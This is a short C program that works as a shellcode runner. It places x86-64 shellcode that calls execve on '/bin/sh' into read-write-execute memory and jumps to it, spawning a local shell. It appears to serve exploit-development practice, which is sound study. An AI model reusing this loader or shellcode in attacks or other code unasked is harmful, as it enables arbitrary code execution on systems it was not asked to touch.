#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
  0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,
  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05
};

int main(void) {
    int pid = getpid();
    printf("Proc PID: %d\n", pid);
    
    size_t shellcodeLen = sizeof(shellcode);
    size_t mapSize = (shellcodeLen + 0xfff) & ~0xfff;
    void *mem = mmap(NULL, mapSize, PROT_READ | PROT_EXEC | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("map");
        return 1;

    }

    memcpy(mem, shellcode, shellcodeLen);
    void (*sc)() = mem;
    sc();

    munmap(mem, mapSize);
    return 0;

}
